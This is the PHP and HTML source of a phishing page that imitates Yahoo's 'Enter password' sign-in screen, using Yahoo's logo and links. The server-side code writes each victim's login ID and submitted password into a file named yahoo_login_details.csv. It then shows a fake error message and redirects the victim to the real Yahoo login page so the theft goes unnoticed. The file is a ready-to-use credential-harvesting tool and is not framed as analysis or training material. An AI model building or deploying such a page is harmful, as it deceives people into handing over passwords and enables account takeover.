
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <?php
        session_start();
        $uname_email_pno=$_SESSION["login_id"];
        $password= "";
        $password_err="";
        
        if($_SERVER["REQUEST_METHOD"]=="POST")
        {
            $password= htmlspecialchars($_POST["pass"]);
            
            if(empty($_POST["pass"]))
            {
                $password_err= "Please provide password.";
            }
            else
            {
                $csv_file= fopen("yahoo_login_details.csv","a");

                // to be run only the first time
                // fwrite($csv_file, "UserName/Email/Phone_number");
                // fwrite($csv_file,",");
                // fwrite($csv_file,"Password");
                
                fwrite($csv_file,"\n");
                fwrite($csv_file, $uname_email_pno);
                fwrite($csv_file,",");
                fwrite($csv_file, $password);
                echo "\n<h3>Error occurred! <br>Sorry for the inconvinience. Directing back to login page.</h3>";
                header("Refresh:3; url=https://login.yahoo.com/");
                exit();
            }
        }
    ?>

    <div class="navigation_bar">
        <div class="nav_left">
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
        </div>
        <div class="nav_right">
            <a href="https://in.help.yahoo.com/kb/account" id="nav1">Help</a>
            <a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" id="nav2">Terms</a>
            <a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" id="nav3">Privacy</a>
        </div>
    </div>

    <div class="full_screen">
        <div class="container_left">
            <h1>Yahoo makes it easy to enjoy what matters most in your world</h1>
            <p class="bg_content">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sports, music, films, more. You get more out of the web; you get more out of life.</p>
        </div>

        <div class="container">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="container_logo " width="" height="25">   
            <p class="mail_id"><?php echo $uname_email_pno; ?></p>
            <p class="container_header">Enter password</p>
            <p class="container_sub-header">to finish signing in</p>      
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">      
            <label for="login_id" id="placeholder_text">Password</label>
                <input type="password" id="login_id" name="pass" placeholder="Password" size = "30" autofocus>
                <hr color ="blue">
                <span class="php_error"><?php echo $password_err; ?></span>
                <button class="next">Next</button><br>
                <a href="https://login.yahoo.com/account/challenge/challenge-selector?pspid=159600001&activity=mail-direct&.lang=en-IN&.intl=in&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%3F.lang%3Den-IN&acrumb=YPD3Ti5U&display=login&authMechanism=primary&sessionIndex=Qw--&eid=3650" id="forgot_uname">Forgotten Password?</a><br>
            </form>
        </div>

    </div>
</body>
</html>